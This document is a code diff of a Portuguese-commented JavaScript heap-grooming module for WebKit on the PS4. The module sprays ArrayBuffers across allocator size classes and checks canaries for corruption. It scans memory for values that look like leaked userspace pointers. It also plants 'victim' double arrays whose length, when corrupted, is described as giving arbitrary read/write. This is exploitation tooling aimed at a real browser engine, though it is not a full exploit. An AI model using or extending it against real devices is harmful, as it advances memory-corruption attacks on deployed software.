@@ -1,21 +1,15 @@
 /**
  * MOD_MUTATOR.JS — Heap Groomer para detecção de UAF e OOB
- *
- * Módulo responsável por controlar o layout do heap e preparar "vítimas"
- * para detetar corrupções silenciosas de memória no WebKit.
+ * Atualizado: Size classes do DOM, Múltiplos OOBs e Floats granulares.
  */
 
 export const Mutator = {
+    CANARY_A: 0x41,
+    CANARY_B: 0x42,
 
-    CANARY_A: 0x41, // 'A' — spray antes do free
-    CANARY_B: 0x42, // 'B' — spray depois do free
+    // 🚨 FIX: Adicionado 96, 160 e 192 para cobrir os objetos Node/Element do bmalloc (DOM)
+    SIZE_CLASSES: [32, 64, 96, 128, 160, 192, 256, 512, 1024],
 
-    // Classes de tamanho do IsoHeap/bmalloc do WebKit no PS4
-    SIZE_CLASSES: [32, 64, 128, 256, 512, 1024],
-
-    /**
-     * Aloca `count` ArrayBuffers de `size` bytes, todos preenchidos com `canary`.
-     */
     spray: function(size, count, canary) {
         let slots = new Array(count);
         for (let i = 0; i < count; i++) {
@@ -26,21 +20,14 @@ export const Mutator = {
         return slots;
     },
 
-    /**
-     * Groom em todas as size classes simultaneamente.
-     */
     groomAll: function(canary, countPerClass = 64) {
         let slots = [];
         for (let sz of this.SIZE_CLASSES) {
-            let chunk = this.spray(sz, countPerClass, canary);
-            slots.push(...chunk);
+            slots.push(...this.spray(sz, countPerClass, canary));
         }
         return slots;
     },
 
-    /**
-     * Verifica se algum slot ArrayBuffer foi corrompido (Write-After-Free).
-     */
     checkCorruption: function(slots, expectedCanary) {
         for (let buf of slots) {
             try {
@@ -57,32 +44,21 @@ export const Mutator = {
                         };
                     }
                 }
-            } catch(e) { /* slot pode ter sido detachado */ }
+            } catch(e) {}
         }
         return { corrupted: false };
     },
 
-    /**
-     * Varre slots em busca de valores que pareçam ponteiros do PS4 userspace.
-     */
     scanForPointers: function(slots) {
         const found = [];
-        const LO = 0x0000100000000000n;
-        const HI = 0x0000800000000000n;
-
         for (let buf of slots) {
             if (buf.byteLength < 8) continue;
             try {
                 let view = new DataView(buf);
                 for (let off = 0; off + 8 <= buf.byteLength; off += 8) {
                     let val = view.getBigUint64(off, true);
-                    if (val > LO && val < HI) {
-                        found.push({
-                            offset: off,
-                            slotSize: buf.byteLength,
-                            val,
-                            hex: '0x' + val.toString(16).padStart(16, '0')
-                        });
+                    if (val > 0x0000100000000000n && val < 0x0000800000000000n) {
+                        found.push({ offset: off, slotSize: buf.byteLength, val, hex: '0x' + val.toString(16).padStart(16, '0') });
                     }
                 }
             } catch(e) {}
@@ -90,49 +66,38 @@ export const Mutator = {
         return found;
     },
 
-    // ─── NOVA SECÇÃO: OOB Array Canaries ──────────────────────────────
-
-    /**
-     * Aloca milhares de arrays de doubles.
-     * Se corrompermos o length de um destes no C++, ganhamos Arbitrary Read/Write.
-     */
     groomOOB: function(count = 2000) {
         let victims = new Array(count);
         for (let i = 0; i < count; i++) {
-            // Array de tamanho fixo 4
-            let arr = [1.1, 2.2, 3.3, 4.4];
-            arr.marker = 0x1337; // Assinatura para identificar o array na memória
+            // 🚨 FIX: Floats hiper-granulares para evitar colisões
+            let arr = [1.1111111111111, 2.2222222222222, 3.3333333333333, 4.4444444444444];
+            arr.marker = 0x1337; 
             victims[i] = arr;
         }
         return victims;
     },
 
-    /**
-     * Varre as vítimas para ver se o limite do array foi corrompido
-     * por um overflow (Ex: o bug do RegExp)
-     */
     scanOOB: function(victims) {
+        let corruptedCount = 0;
+        let firstReason = null;
+
         for (let i = 0; i < victims.length; i++) {
             let arr = victims[i];
             
-            // O ALVO DE OURO: O tamanho do array mudou sem que o JS o tocasse?
             if (arr.length !== 4) {
-                return {
-                    corrupted: true,
-                    type: 'LENGTH_CORRUPTION',
-                    reason: `💥 OOB CONFIRMADO! O array canário [${i}] mudou o tamanho de 4 para ${arr.length}. Butterfly sobrescrito!`
-                };
-            }
-
-            // O ALVO DE PRATA: O tamanho está igual, mas os dados internos foram sobrescritos?
-            if (arr[0] !== 1.1 || arr[1] !== 2.2) {
-                return {
-                    corrupted: true,
-                    type: 'DATA_OVERWRITE',
-                    reason: `⚠️ OOB DATA WRITE! O conteúdo do array canário [${i}] foi corrompido silenciosamente.`
-                };
+                corruptedCount++;
+                if (!firstReason) firstReason = `💥 OOB CONFIRMADO! length de 4 para ${arr.length}`;
+            } else if (arr[0] !== 1.1111111111111 || arr[1] !== 2.2222222222222) {
+                corruptedCount++;
+                if (!firstReason) firstReason = `⚠️ DATA OVERWRITE silencioso no índice [${i}]`;
             }
         }
+        
+        // 🚨 FIX: Agora reporta o TOTAL de arrays afetados pelo blast radius
+        if (corruptedCount > 0) {
+            return { corrupted: true, count: corruptedCount, reason: `${firstReason} (Total afetados: ${corruptedCount})` };
+        }
+        
         return { corrupted: false };
     }
 };
